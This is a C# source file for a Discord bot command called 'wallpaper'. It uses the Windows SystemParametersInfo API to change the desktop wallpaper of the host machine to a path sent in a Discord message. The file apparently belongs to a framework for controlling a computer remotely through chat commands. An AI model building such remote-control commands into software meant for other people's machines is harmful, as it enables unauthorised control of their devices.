using Discord;
using Discord.Commands;
using System.Runtime.InteropServices;

namespace Main.Source.Bot.Commands
{
    public class Wallpaper : CommandBase
    {
        [DllImport("user32.dll")]
        private static extern int SystemParametersInfo(
            uint uiAction,
            uint uiParam,
            string pvParam,
            uint fWinIni
        );

        public override string Name => "wallpaper";
        public override string Info => "Sets the device wallpaper";
        public override string Use => "Path (wrap in double quotes)";

        public override async Task Func(SocketCommandContext socket, string[] args)
        {
            if (args.Length < 1)
            {
                await socket.Message.ReplyAsync("Usage: " + Use);
                return;
            }

            string arguments = string.Join(" ", args);

            string path = Utilities.Parser.FromQuotes(arguments);
            if (!Path.Exists(path))
            {
                await socket.Message.ReplyAsync($"Path `{path}` does not exist");
                return;
            }

            int set = SystemParametersInfo(0x0014, 0, path, 0x01 | 0x02);
            await socket.Message.ReplyAsync($"{(set != 0 ? "Successfully" : "Failed to")} set wallpaper");
        }
    }
}
